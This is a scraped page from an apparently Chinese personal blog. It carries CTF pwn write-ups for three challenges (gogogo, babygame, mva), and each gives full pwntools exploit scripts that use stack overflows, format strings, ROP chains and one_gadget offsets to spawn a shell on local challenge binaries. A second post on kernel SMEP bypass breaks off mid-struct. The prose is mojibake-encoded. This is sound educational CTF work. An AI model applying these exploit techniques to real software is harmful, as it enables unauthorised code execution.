              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-03-24 23:15:28 / ä¿®æ”¹æ—¶é—´ï¼š23:15:55" itemprop="dateCreated datePublished" datetime="2022-03-24T23:15:28+08:00">2022-03-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è™ç¬¦ctf"><a href="#è™ç¬¦ctf" class="headerlink" title="è™ç¬¦ctf"></a>è™ç¬¦ctf</h1><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>ä¸»è¦éš¾ç‚¹åœ¨é€†å‘ï¼Œä»£ç æœ‰ä¸€åƒå¤šè¡Œï¼Œida7.7èƒ½å¤§è‡´åç¼–è¯‘å‡ºgoçš„ä¼ªä»£ç ï¼Œä½†æ˜¯ä¼ªä»£ç ä¸­è¿˜æ˜¯æœ‰å¾ˆå¤šæ„ä¹‰ä¸æ˜çš„ä»£ç å‡ºç°ï¼Œå†åŠ ä¸Šgoçš„å‡½æ•°è°ƒç”¨çš„å‚æ•°æ”¾åœ¨çˆ¶å‡½æ•°çš„æ ˆä¸Šï¼Œå¯¼è‡´idaå¯¹å‚æ•°çš„è§£ææ¯”è¾ƒå¯†ï¼Œä¸èƒ½å¾ˆå¥½çš„çœ‹å‡ºä¼ å…¥çš„å‚æ•°æ˜¯å•¥ï¼Œåªèƒ½åŠ¨æ€è°ƒè¯•ï¼Œæœ€åé€†å‡ºäº†æœ€åé€€å‡ºçš„æ—¶å€™ä¼šå‘æ ˆä¸Šå†™æ•°æ®ä¸”æœ‰æ ˆæº¢å‡º</p>
<p>ç„¶åä¸­é—´è¿˜å¾—ç©ä¸ªå¾ˆå¤æ‚çš„æ¸¸æˆï¼Œä¸»è¦éš¾ç‚¹å°±è¿™ä¸¤ä¸ªäº†ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000045c849: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000405b78: pop rax; ret;</span></span><br><span class="line"><span class="string">0x00000000004742da: pop rdi; xor eax, eax; mov rbp, qword ptr [rsp + 0xb0]; add rsp, 0xb8; ret;</span></span><br><span class="line"><span class="string">0x000000000045544a: pop rsi; add byte ptr [rax], al; mov byte ptr [rax], 1; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span></span><br><span class="line"><span class="string">0x000000000048546c: pop rdx; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bss=<span class="number">0x538000</span>+<span class="number">0x20</span></span><br><span class="line">syscall_ret=<span class="number">0x000000000045c849</span></span><br><span class="line">pop_rax_ret=<span class="number">0x0000000000405b78</span></span><br><span class="line">rdi=<span class="number">0x00000000004742da</span></span><br><span class="line">rsi=<span class="number">0x000000000045544a</span></span><br><span class="line">rdx=<span class="number">0x000000000048546c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;(4) EXIT&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;ARE YOU SURE?&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x48EEA0&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;YOU HAVE SEVEN CHANCES TO GUESS\n&quot;</span>)</span><br><span class="line">    guess=<span class="string">&#x27;3 2 1 0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        sh.sendline(guess)</span><br><span class="line">        ans=sh.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;WIN&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s=<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&#x27;guess:&#x27;</span>))</span><br><span class="line">        guess=s[<span class="number">0</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">1</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">2</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">3</span>]</span><br><span class="line">        <span class="built_in">print</span> guess</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;PLEASE INPUT A NUMBER:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">1717986918</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;PLEASE INPUT A NUMBER:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">305419896</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OKAY YOU CAN LEAVE YOUR NAME AND BYE~&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    game()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;AGAIN OR EXIT?&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x460</span>-<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rax_ret)+p64(bss)</span><br><span class="line">    payload+=p64(rsi)+p64(<span class="number">0</span>)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload+=p64(rdx)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi)+p64(<span class="number">0xc000108000</span>)+<span class="string">&#x27;d&#x27;</span>*<span class="number">0xb8</span></span><br><span class="line">    payload+=p64(pop_rax_ret)+p64(<span class="number">59</span>)+p64(syscall_ret)</span><br><span class="line">    exit(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OKAY YOU CAN LEAVE YOUR NAME AND BYE~&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>æ ˆæº¢å‡ºåŠ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå…ˆé€šè¿‡æº¢å‡ºå¾—åˆ°ä¸€ä¸ªæ ˆåœ°å€å’Œcanary,ç„¶åé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²å¾—åˆ°ä¸€ä¸ªlibcåœ°å€ï¼Œçˆ†ç ´æ”¹è¿”å›åœ°å€ä¸ºfread,ä¸èƒ½ç›´æ¥æ”¹åˆ°mainå‡½æ•°ï¼Œä¸ç„¶æ ‡å‡†è¾“å…¥è¾“å‡ºåœ¨æ²¡æœ‰å…³é—­çš„æƒ…å†µä¸‹ä¼šå†æ‰“å¼€ä¸€æ¬¡ï¼Œç„¶åprintfä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000047400: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000023b72: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002604f: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000119241: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">0x00000000000630d9: syscall; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    fd=<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r+&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        content=<span class="string">&quot;round &#123;0&#125;: \n&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(content)</span><br><span class="line">        sh.sendline(fd.read(<span class="number">1</span>))</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot; b *(0x7ffff7fc6000+0x1565)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">    sh.sendafter(<span class="string">&quot;Please input your name:\n&quot;</span>,payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">    canary=u64(sh.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">    stack_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line">    game()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Good luck to you.&quot;</span>)</span><br><span class="line">    fmt=<span class="string">&#x27;%3$p&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x74Aa</span>-<span class="number">0xe</span>)+<span class="string">&#x27;c%8$hn&#x27;</span>+p64(stack_addr-<span class="number">0x210</span>)</span><br><span class="line">    <span class="comment"># print len(&#x27;%3$p&#x27;+&#x27;%&#x27;+str(0x7465-0xe)+&#x27;c%8$hn&#x27;)</span></span><br><span class="line">    sh.send(fmt)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    s=sh.recvline()</span><br><span class="line">    m=sh.recv()</span><br><span class="line">    libc_addr=<span class="built_in">int</span>(m[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">0x10e002</span></span><br><span class="line">    pop_rax=libc_addr+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi=libc_addr+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12=libc_addr+<span class="number">0x0000000000119241</span></span><br><span class="line">    syscall=libc_addr+<span class="number">0x00000000000630d9</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please input your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">59</span>)+p64(pop_rdi)+p64(stack_addr-<span class="number">0x208</span>)+p64(pop_rsi)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(pop_rdx_r12)+<span class="number">2</span>*p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;2. paper&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;12345&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h2><p>ç¬¬ä¸€æ¬¡åšvmé¢˜ï¼Œè¿™ä¸ªåº”è¯¥ç®—æ˜¯æ¯”è¾ƒç®€å•çš„vmé¢˜ï¼Œç¨‹åºè™šæ‹Ÿäº†å‡ ä¸ªæŒ‡ä»¤é›†ï¼ŒåŒ…æ‹¬<code>push,pop,add sub mov xor add or</code>ç­‰ï¼Œç„¶åè¿˜è™šæ‹Ÿäº†å…­ä¸ªå¯„å­˜å™¨ ï¼Œæ¯æ¬¡è¯»å–å››ä¸ªå­—èŠ‚ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯æŒ‡ä»¤ç ï¼Œæ¯”å¦‚addæ˜¯<code>\x02</code>,ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯ç›®çš„å¯„å­˜å™¨ï¼Œç¬¬ä¸‰ç¬¬å››ä¸ªå¯„å­˜å™¨æ˜¯æ“ä½œæ•°æ¯”å¦‚<code>\x02\x00\x01\x02</code>å°±æ˜¯æŠŠç¬¬äºŒä¸ªå¯„å­˜å™¨çš„æ•°å’Œç¬¬0ä¸ªå¯„å­˜å™¨çš„æ•°ç›¸åŠ ç„¶åèµ‹å€¼ç»™ç¬¬ä¸€ä¸ªå¯„å­˜å™¨ã€‚</p>
<p>æ¼æ´å°±å‡ºåœ¨å¯¹è¾¹ç•Œçš„æ£€æŸ¥ä¸è§„èŒƒå¯¼è‡´äº†å†…å­˜å†™å’Œå†…å­˜è¯»ã€‚</p>
<p>æ­£å¸¸æœ‰å…­ä¸ªå¯„å­˜å™¨ï¼Œé€‰é¡¹1æ˜¯å¯¹å•ä¸ªå¯„å­˜å™¨è¿›è¡Œèµ‹å€¼ï¼Œé€‰é¡¹2,3,4,5,6,7æ˜¯å¯¹å¯„å­˜å™¨è¿›è¡Œè®¡ç®—ï¼Œé€‰é¡¹9æ˜¯<br>å…¥æ ˆæ“ä½œï¼Œè¿™ä¸ªå¯ä»¥åˆ©ç”¨v9å®Œæˆè¿”å›åœ°å€å†™ï¼Œé€‰é¡¹aæ˜¯å‡ºæ ˆæ“ä½œï¼Œå¯ä»¥åˆ©ç”¨v9è¿›è¡Œè¿”å›åœ°å€çš„è¯»ã€‚é€‰é¡¹då¯ä»¥è¿›è¡Œä¸€ä¸ª<br>å°èŒƒå›´çš„è¯»ï¼Œé€‰é¡¹eå¯ä»¥è¿›è¡Œå°èŒƒå›´çš„è¯»ï¼Œé€‰é¡¹eå¯ä»¥è¿›è¡Œå°èŒƒå›´çš„å†™ï¼Œé€šè¿‡è¿™ä¸ªæ”¹å†™v9ã€‚</p>
<p>é€šè¿‡ä¸Šé¢çš„å‡ ä¸ªæ¼æ´çš„ç»„åˆå°±èƒ½getshelläº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./mva&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xe6c81</span></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *(0x7ffff7fc6000+0x1A62)&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>)</span><br><span class="line">addr_offset=<span class="number">0x270b3</span></span><br><span class="line">pay=<span class="string">&#x27;\x01\x00\x01\x0f&#x27;</span><span class="comment">#s0=0x110</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf6\x00&#x27;</span><span class="comment">#v9=s0=0x110</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x01\x00\x00&#x27;</span><span class="comment">#s1=(ret_addr&amp;0xffff00000000)&gt;&gt;32</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x02\x00\x00&#x27;</span><span class="comment">#s2=(ret_addr&amp;0xffff0000)&gt;&gt;16</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x03\x00\x00&#x27;</span><span class="comment">#s3=(ret_addr&amp;0xfffff)</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x70\xb3&#x27;</span><span class="comment">#s0=0x70b3</span></span><br><span class="line">pay+=<span class="string">&#x27;\x03\x03\x03\x00&#x27;</span><span class="comment">#s3=s3-s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x02&#x27;</span><span class="comment">#s0=0x2</span></span><br><span class="line">pay+=<span class="string">&#x27;\x03\x02\x02\x00&#x27;</span><span class="comment">#s2=s2-s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00&#x27;</span>+p8(<span class="number">0x6c</span>)+p8(<span class="number">0x81</span>)<span class="comment">#s0=0x6c81</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x03\x03\x00&#x27;</span><span class="comment">#s3=s3+s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00&#x27;</span>+p8(<span class="number">0xe</span>)<span class="comment">#s0=0xe</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x02\x02\x00&#x27;</span><span class="comment">#s2=s2+s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x01\x0c&#x27;</span><span class="comment">#s0=0x10c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf6\x00&#x27;</span><span class="comment">#v9&amp;0xffff=07x10c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x80\x00&#x27;</span><span class="comment">#s0=0x8000</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf9\x00&#x27;</span><span class="comment">#v9=0x800000000000010c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x00&#x27;</span><span class="comment">#s0=0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x00\x03\x00&#x27;</span><span class="comment">#s0=s3</span></span><br><span class="line">pay+=<span class="string">&#x27;\x09\x00\x00\x00&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x00&#x27;</span><span class="comment">#s0=0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x00\x02\x00&#x27;</span><span class="comment">#s0=s2</span></span><br><span class="line">pay+=<span class="string">&#x27;\x09\x00\x00\x00&#x27;</span></span><br><span class="line">sh.sendline(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/smep%E7%BB%95%E8%BF%87%E5%8F%8Atty-opertions/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/smep%E7%BB%95%E8%BF%87%E5%8F%8Atty-opertions/" class="post-title-link" itemprop="url">smepç»•è¿‡åŠtty_opertions</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-03-12 01:59:36 / ä¿®æ”¹æ—¶é—´ï¼š02:01:05" itemprop="dateCreated datePublished" datetime="2022-03-12T01:59:36+08:00">2022-03-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="smepç»•è¿‡"><a href="#smepç»•è¿‡" class="headerlink" title="smepç»•è¿‡"></a>smepç»•è¿‡</h1><h2 id="0x1-smepæœºåˆ¶"><a href="#0x1-smepæœºåˆ¶" class="headerlink" title="0x1 smepæœºåˆ¶"></a>0x1 smepæœºåˆ¶</h2><p>smepæ˜¯å†…æ ¸æ€çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œå½“CPUå¤„äºå†…æ ¸æ€çš„æ—¶å€™ï¼Œå³å¤„äºring0çš„æ—¶å€™ä¸å…è®¸è®¿é—®ç”¨æˆ·æ€çš„ä»£ç ï¼Œæ‰€ä»¥ä¸Šç¯‡çš„ret2userå°±ç›´æ¥ä¸èƒ½ä½¿ç”¨äº†ã€‚</p>
<p>ä½†æ˜¯ä¹Ÿæœ‰ç»•è¿‡åŠæ³•ï¼Œè¿™ä¸ªå®ç°smepçš„æœºåˆ¶å¯†ä¸å¯åˆ†ï¼Œç³»ç»Ÿä¼šé€šè¿‡cr4çš„ç¬¬20ä½æ˜¯å¦ä¸º1åˆ¤æ–­æ˜¯å¦å¼€å¯äº†smep,åªè¦èƒ½æ‰§è¡Œropç„¶åmovæ”¹å˜cr4çš„ç¬¬äºŒåä½ä¸º0å°±è¡Œï¼Œç„¶åå°±å¯ä»¥æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç äº†ã€‚</p>
<h2 id="0x2-tty-struct"><a href="#0x2-tty-struct" class="headerlink" title="0x2 tty_struct"></a>0x2 tty_struct</h2><p>å½“ç”¨æˆ·æ‰“å¼€ptmxé©±åŠ¨çš„æ—¶å€™ä¼šç»™å…¶åˆ†é…ä¸€ä¸ªtty_structç»“æ„ï¼Œå…·ä½“å®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span>  </span><br><span class="line">    <span class="keyword">int</span> magic;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 